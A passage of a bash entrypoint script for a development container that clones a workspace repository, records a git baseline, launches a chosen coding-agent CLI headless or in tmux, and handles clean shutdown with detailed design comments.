# when /workspace already holds a working copy (a persistent recreate never
# re-clones over local state). A bind workspace is never given a clone URL by the
# CLI. Runs BEFORE the agent launch (interactive window / headless workload).
WORKSPACE_DIR="${AGENT_CONTAINER_WORKSPACE:-/workspace}"
CLONE_URL="${AGENT_CONTAINER_CLONE_URL:-}"
if [[ -n "${CLONE_URL}" ]]; then
    if [[ -d "${WORKSPACE_DIR}/.git" ]]; then
        log "clone-on-start: ${WORKSPACE_DIR} already holds a working copy, skipping clone"
    elif [[ -n "$(ls -A "${WORKSPACE_DIR}" 2>/dev/null)" ]]; then
        log "clone-on-start: ${WORKSPACE_DIR} is non-empty (no .git) — skipping clone"
    else
        case "${CLONE_URL}" in
            https://github.com/*)
                # The git credential helper (section 3) is scoped to https://github.com,
                # so GH_TOKEN authenticates ONLY github.com HTTPS clones.
                log "clone-on-start: cloning via HTTPS (github.com → GH_TOKEN)"
                git clone "${CLONE_URL}" "${WORKSPACE_DIR}" || die "clone-on-start failed for ${CLONE_URL}"
                ;;
            https://*)
                # A non-github.com HTTPS remote: GH_TOKEN does NOT apply (the helper is
                # github.com-scoped for least exposure). Works only if the repo is public
                # or git already has ambient credentials for that host.
                log "clone-on-start: cloning via HTTPS (non-github.com host — GH_TOKEN does NOT apply; repo must be public or have its own git credentials)"
                git clone "${CLONE_URL}" "${WORKSPACE_DIR}" || die "clone-on-start failed for ${CLONE_URL}"
                ;;
            *)  # ssh:// or scp-like git@host:path — the agent's own key (section 3b)
                # PENDING, NOT FATAL. A failure here is overwhelmingly "the key is not
                # registered yet", which is the expected first-boot state — and dying
                # would leave an operator with no container to read the key from.
                #
                # BOTH outcomes leave a marker. The CLI reaches this container as soon
                # as the public key exists (section 3b, well before here), so ABSENCE of
                # the pending file conflates "cloned fine" with "still cloning" — and
                # the CLI would report success while the clone is in flight. A decided
                # answer needs a positive signal for BOTH branches; stale ones go first,
                # since this runs again on every recreate.
                log "clone-on-start: cloning via SSH (the agent's own key)"
                rm -f "${SSH_DIR}/.clone_pending" "${SSH_DIR}/.clone_done" 2>/dev/null || true
                if git clone "${CLONE_URL}" "${WORKSPACE_DIR}"; then
                    : > "${SSH_DIR}/.clone_done"
                else
                    rm -rf "${WORKSPACE_DIR:?}/.git" 2>/dev/null || true
                    printf '%s\n' "${CLONE_URL}" > "${SSH_DIR}/.clone_pending"
                    log "clone-on-start: PENDING — could not clone ${CLONE_URL}."
                    log "  The agent SSH key is generated in this container and must be"
                    log "  REGISTERED on the remote before it can clone or push:"
                    log "    $(cat "${AGENT_KEY}.pub")"
                    log "  Register it, then run: agent-container redeploy <name>"
                    log "  Do NOT tear this environment down — that destroys the key you are"
                    log "  about to register, and the replacement will be a different key."
                fi
                ;;
        esac
    fi
fi

# --- 3e. Repository baseline (Feature 016, T026) ----------------------------
# Take the workspace's git position now, AFTER clone-on-start and BEFORE either
# mode launches its agent. The ordering is the whole point: measured before the
# clone, a fresh clone's entire imported history would be recorded as commits
# this run made; measured after the agent starts, the agent's own first commit
# would be missing from the baseline and so invisible in the effect.
#
# Runs for both modes — an interactive session changes a repository exactly as a
# headless run does (FR-013) — and never fails the run (runs_safely).
runs_safely runs_repo_capture_start

# --- Feature 004: execution mode + per-agent invocation ---------------------
# AGENT_CONTAINER_MODE, AGENT_CONTAINER_AGENT and TASK_FILE are resolved in
# section 1r, which needs them to open the run record before anything below can
# `die` or be killed. They are read, not re-defaulted, here — a second `:-`
# default is a second answer, and the record would eventually name an agent that
# did not run.

# Feature 010 FR-012: fail CLEARLY when the selected agent is not in this image
# (an image built before the agent was added). Without this the failure surfaces
# as `exec: <agent>: not found` / exit 127, which names no remedy. Checked for the
# SELECTED agent only — preflighting all four would make a partially-stale image
# refuse to start entirely, which is a worse outcome than the one being fixed.
require_agent_binary() {
    local a="$1"
    command -v "${a}" >/dev/null 2>&1 && return 0
    die "agent '${a}' is not installed in this image (built before it was added). Rebuild the image and recreate: agent-container redeploy <name>"
}

# Interactive launch command for the tmux window: the agent, seeded with the task.
# The task text is kept out of the host-side compose model and read from the
# injected file at runtime — it is then passed to the agent as its argument (so it
# appears in the agent's in-container process argv, the same as any prompt would).
# Returns an empty string for an unknown/blank agent so the caller can skip the launch.
build_interactive_cmd() {
    local a="$1"
    case "${a}" in
        claude) [[ -f "${TASK_FILE}" ]] && echo "claude \"\$(cat ${TASK_FILE})\"" || echo "claude" ;;
        codex)  [[ -f "${TASK_FILE}" ]] && echo "codex \"\$(cat ${TASK_FILE})\""  || echo "codex" ;;
        pi)     [[ -f "${TASK_FILE}" ]] && echo "pi \"\$(cat ${TASK_FILE})\""      || echo "pi" ;;
        # opencode's TUI positional is a PROJECT DIRECTORY, not a message
        # (`opencode [project]`), so the task must NOT be passed as an argument —
        # `opencode "fix the bug"` would be read as a path. The task is delivered
        # for headless runs only; interactive opencode starts unseeded and the
        # operator pastes the task. Verified against `opencode --help` (1.18.6).
        opencode) echo "opencode" ;;
        *) echo "" ;;
    esac
}

# Headless TERM/INT handler (Feature 016 T014). Replaces runs_signal_stop once
# there is an agent to stop as well as a record to close.
headless_shutdown() {
    RUNS_SIGNALLED=1
    log "shutdown signal received, stopping the headless agent"
    # Forward FIRST — it does not block, so the agent begins flushing while the
    # record is written. Then make the record durable. Only THEN wait.
    #
    # SIGTERM starts the runtime's stop grace period and SIGKILL ends it, so
    # everything before the wait must be bounded, and it is: a kill, a date, and
    # a rename. The wait is not bounded, and does not need to be — by the time it
    # runs the record is already on the volume, so a SIGKILL at the end of the
    # grace period costs nothing (research R5, SC-008).
    if [[ -n "${AGENT_PID}" ]]; then
        kill -TERM "${AGENT_PID}" 2>/dev/null || true
    fi
    runs_safely runs_complete ""
    local rc=143
    if [[ -n "${AGENT_PID}" ]]; then
        wait "${AGENT_PID}"
        rc=$?
    fi
    exit "${rc}"
}

# Headless: run the agent's non-interactive form as the container's workload so
# the CONTAINER exits with the agent's exit code (004 FR-002). The task (possibly
# empty) is read from the injected file.
run_headless_agent() {
    local a="$1" t="" rc=0
    [[ -f "${TASK_FILE}" ]] && t="$(cat "${TASK_FILE}")"
    # Validate the NAME before probing for the binary. Reversed, an unknown agent
    # such as 'gpt' would report "not installed in this image — run redeploy",
    # sending the operator to rebuild an image that was never the problem.
    case "${a}" in
        claude|codex|pi|opencode) ;;
        *) die "headless mode: unknown agent '${a}' (choose claude|codex|pi|opencode)" ;;
    esac
    require_agent_binary "${a}"
    local -a cmd
    case "${a}" in
        claude) cmd=(claude -p "${t}") ;;
        codex)  cmd=(codex exec "${t}") ;;
        pi)     cmd=(pi -p "${t}") ;;
        # `opencode run` is the documented non-interactive form. VERIFIED to
        # propagate a failing exit status (research R5), which FR-005 requires.
        opencode) cmd=(opencode run "${t}") ;;
        *) die "headless mode: unknown agent '${a}' (choose claude|codex|pi|opencode)" ;;
    esac
    # NOT `exec`, and the run record is the whole reason. `exec` replaced this
    # entrypoint with the agent, which left NOTHING to complete the record when
    # the agent exited (T013) and NOTHING to trap SIGTERM (T014) — a stopped run
    # was indistinguishable from a vanished one. The exit status is therefore
    # propagated by hand below, and a test pins that the container still exits
    # with the agent's code (004 FR-002).
    trap headless_shutdown TERM INT
    # `<&0` is load-bearing. Bash redirects an ASYNCHRONOUS command's stdin from
    # /dev/null when job control is off, so without it the agent would read EOF
    # where `exec` handed it the container's stdin — a behaviour change nobody
    # asked for, hidden inside a change about record-keeping.
    "${cmd[@]}" <&0 &
    AGENT_PID=$!
    # `|| rc=$?` and not a bare `wait`: under `set -e` a failing agent would end
    # this script immediately, before the exit trap could record WHY it failed.
    wait "${AGENT_PID}" || rc=$?
    exit "${rc}"
}

if [[ "${AGENT_CONTAINER_MODE}" == "headless" ]]; then
    # No tmux — output is retrieved via `compose logs` and the result is the
    # container exit code (research R5). sshd IS running: it started in section 2b2,
    # because it is the primary interaction surface with the agent and a headless run
    # is precisely when an operator needs to look inside one they cannot attach to.
    log "headless mode: running agent '${AGENT_CONTAINER_AGENT:-claude}' as the container workload"
    run_headless_agent "${AGENT_CONTAINER_AGENT:-claude}"
    # run_headless_agent always exits, by its own `exit` or by its trap's.
    die "headless agent did not run"
fi

# --- 5. tmux session --------------------------------------------------------
# Detached session named 'main'. On first creation, build a configurable set of
# windows from AGENT_CONTAINER_TMUX_WINDOWS (space-separated names). Default when unset:
# "shell edit agents". Opt-out: setting AGENT_CONTAINER_TMUX_WINDOWS to an EMPTY string
# creates just a single default window (today's behavior). Windows are BARE
# SHELLS — agents are NEVER auto-launched via send-keys. Idempotent: the layout
# is built only inside the has-session guard (when the session does not already
# exist), so a restart never duplicates windows. Each requested window name is
# validated against a safe charset before it reaches tmux; invalid names are
# skipped, never forwarded unsanitized. No env-var value is ever echoed.
if tmux has-session -t main 2>/dev/null; then
    log "tmux session 'main' already exists, leaving it alone"
else
    # '-' (not ':-') so an unset var falls back to the default layout while an
    # explicitly-empty value is honored as an opt-out.
    tmux_windows="${AGENT_CONTAINER_TMUX_WINDOWS-shell edit agents}"
    valid_windows=()
    for w in ${tmux_windows}; do
        if [[ "${w}" =~ ^[A-Za-z0-9._-]+$ ]]; then
            valid_windows+=("${w}")
        else
            log "skipping invalid tmux window name (must match [A-Za-z0-9._-]+)"
        fi
    done
    if [[ ${#valid_windows[@]} -eq 0 ]]; then
        # Opt-out (empty var) or every requested name rejected: single window.
        tmux new-session -d -s main
        log "tmux session 'main' ready (single default window)"
    else
        # First window carries the session and is named after the first entry.
        # Capture its window id so we can reselect it UNAMBIGUOUSLY below: an
        # all-numeric name (permitted by the charset) would otherwise be read by
        # `select-window -t main:NAME` as a window INDEX, landing on the wrong
        # window. The #{window_id} form (e.g. '@0') is never index-ambiguous.
        first_id="$(tmux new-session -d -P -F '#{window_id}' -s main -n "${valid_windows[0]}")"
        for (( wi = 1; wi < ${#valid_windows[@]}; wi++ )); do
            tmux new-window -t main -n "${valid_windows[wi]}"
        done
        # Select the first window so an attach lands there (by id, not name).
        tmux select-window -t "${first_id}"
        log "tmux session 'main' ready with ${#valid_windows[@]} window(s)"
    fi
fi

# --- 5b. Launch the primary agent (Feature 004, US1) ------------------------
# In interactive mode, run the chosen agent in a DEDICATED tmux window, seeded
# with the injected task if present. Only when an agent is configured
# (AGENT_CONTAINER_AGENT set) — otherwise the pre-004 bare-shell layout stands
# (backward compatible; no agent auto-launched). Idempotent: skip if the window
# already exists. A crash-restart rebuilds 'main' fresh (has-session was false),
# so the agent relaunches on a fresh session (FR-009).
if [[ -n "${AGENT_CONTAINER_AGENT}" ]]; then
    if tmux list-windows -t main -F '#{window_name}' 2>/dev/null | grep -qxF "${AGENT_CONTAINER_AGENT}"; then
        log "agent window '${AGENT_CONTAINER_AGENT}' already present, leaving it alone"
    else
        require_agent_binary "${AGENT_CONTAINER_AGENT}"
        if [[ "${AGENT_CONTAINER_AGENT}" == "opencode" && -f "${TASK_FILE}" ]]; then
            log "NOTE: opencode's interactive TUI takes a project directory, not a message, so the injected task is NOT seeded into the session; paste it in, or use --mode headless where the task IS delivered."
        fi
        launch_cmd="$(build_interactive_cmd "${AGENT_CONTAINER_AGENT}")"
        if [[ -n "${launch_cmd}" ]]; then
            tmux new-window -t main -n "${AGENT_CONTAINER_AGENT}" "${launch_cmd}"
            # Land an attach on the agent window (by name; the names
            # claude/codex/pi/opencode are never index-ambiguous).
            tmux select-window -t "main:${AGENT_CONTAINER_AGENT}"
            log "launched agent '${AGENT_CONTAINER_AGENT}' in a tmux window (attach lands here)"
        fi
    fi
fi

# --- 6. PID 1 lifecycle + signal handling -----------------------------------
# Trap SIGTERM/SIGINT for a clean shutdown: stop the tmux server, stop sshd,
# then exit 0. `tail -f /dev/null &` + `wait` is the canonical pattern that
# lets bash's trap fire promptly (a foreground `exec tail` would not).

shutdown() {
    RUNS_SIGNALLED=1
    log "shutdown signal received, stopping tmux and sshd"
    # The record goes FIRST (Feature 016 T014). SIGTERM opens the runtime's stop
    # grace period and SIGKILL closes it; `tmux kill-server` is the one unbounded
    # step in this handler, and a record written after it is a record that may
    # never be written at all (research R5). Nothing below can fail the run —
    # this handler exits 0 regardless, exactly as it did before.
    runs_safely runs_complete ""
    tmux kill-server 2>/dev/null || true
    # sshd runs as dev (rootless); dev can signal its own process — no sudo.
    pkill -TERM -x sshd 2>/dev/null || true
    exit 0
}

# Supersedes runs_signal_stop, which covered the setup window before tmux and
# sshd existed to be stopped.
trap shutdown TERM INT

tail -f /dev/null &
TAIL_PID=$!
wait "${TAIL_PID}"
